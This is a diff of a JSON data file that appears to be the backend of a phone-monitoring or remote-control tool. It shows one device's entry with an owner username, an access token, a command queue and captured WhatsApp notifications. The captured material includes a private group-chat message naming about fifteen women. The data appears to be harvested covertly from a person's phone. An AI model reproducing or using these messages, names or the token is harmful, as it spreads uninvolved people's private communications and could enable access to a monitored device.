@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776984144997,
+    "lastSeen": 1776984169128,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -9971,6 +9971,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (2 pesan): ~ .",
+        "content": "📷 Foto",
+        "time": "24/04 06:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776984146502
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎197 pesan dari 5 chat",
         "time": "24/04 06:42",
@@ -13960,14 +13968,6 @@
         "time": "23/04 12:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1776919327416
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Senam Rappocini (3 pesan): ~ Tinieq",
-        "content": "Tabe ibu ibu yang mau ke  Anjungan besok sore  senam listmi namax \n1.Rosmini\n2.Dg pat muli\n3.Halbatia\n4 kartini\n5.Hera\n6.isa\n7.mustafia\n8.kak suarni\n9.dg lanti\n10.ibu fit\n11. Dg sakking\n12. Tika\n13. Nursamsi\n14. Leli\n15. Dg sanga",
-        "time": "23/04 12:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776919185089
       }
     ],
     "galleryPhotos": [],
